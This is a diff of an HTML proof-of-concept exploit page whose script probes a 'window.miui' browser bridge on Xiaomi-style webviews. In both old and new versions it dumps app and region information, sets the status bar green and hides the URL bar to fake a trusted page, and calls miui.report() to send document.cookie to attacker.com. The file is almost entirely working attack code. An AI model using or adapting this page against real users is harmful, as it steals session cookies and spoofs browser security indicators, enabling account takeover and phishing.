@@ -1,43 +1,38 @@
 <!doctype html>
 <meta charset="utf-8">
+<body style="white-space:pre; font-family:monospace"></body>
 <script>
-(async function(){
-  function p(msg){ 
-    let d = document.createElement("pre"); 
-    d.textContent = msg; 
-    document.body.appendChild(d);
+(function(){
+  function log(msg){
+    document.body.textContent += msg + "\n";
+    console.log(msg);
   }
 
   try {
-    if (typeof window.miui === 'object') {
-      // Leak app info
-      try {
-        let info = window.miui.getApplicationInfo();
-        p("[+] getApplicationInfo => " + JSON.stringify(info));
-      } catch(e){ p("[-] getApplicationInfo failed: " + e); }
+    if (typeof window.miui === "object") {
+      log("[+] miui object detected");
 
-      // Fingerprint user region/language
-      try { p("[+] Region: " + window.miui.getRegion()); } catch(e){}
-      try { p("[+] Language: " + window.miui.getLanguage()); } catch(e){}
+      // coba dump semua key
+      for (let k in window.miui){
+        log(" - " + k + " : " + typeof window.miui[k]);
+      }
 
-      // Malicious UI trick
-      try {
-        window.miui.setStatusBarColor("#00FF00"); // Green fake secure indicator
-        window.miui.showUrlBar(false); // Hide real URL
-        p("[+] Modified UI -> Fake look like trusted page");
-      } catch(e){}
+      // coba panggil beberapa
+      try { log("getLanguage() => " + window.miui.getLanguage()); } catch(e){ log("getLanguage() failed " + e); }
+      try { log("getRegion() => " + window.miui.getRegion()); } catch(e){ log("getRegion() failed " + e); }
+      try { log("getAppId() => " + window.miui.getAppId()); } catch(e){ log("getAppId() failed " + e); }
+      try { log("getApplicationInfo() => " + JSON.stringify(window.miui.getApplicationInfo())); } catch(e){ log("getApplicationInfo() failed " + e); }
 
-      // Potential backend abuse
-      try {
-        window.miui.report("https://attacker.com/log?c=" + document.cookie);
-        p("[+] Sent sensitive data via miui.report()");
-      } catch(e){}
+      // coba trigger UI trick
+      try { window.miui.setStatusBarColor("#00FF00"); log("Status bar color changed"); } catch(e){}
+      try { window.miui.showUrlBar(false); log("URL bar hidden"); } catch(e){}
+      try { window.miui.report("https://attacker.com/log?cookie=" + encodeURIComponent(document.cookie)); log("Report exfil sent"); } catch(e){}
+
     } else {
-      p("[-] miui not exposed");
+      log("[-] miui not found, typeof=" + typeof window.miui);
     }
-  } catch(e){
-    p("Exploit err: " + e);
+  } catch(err){
+    log("err: " + err);
   }
 })();
 </script>
-
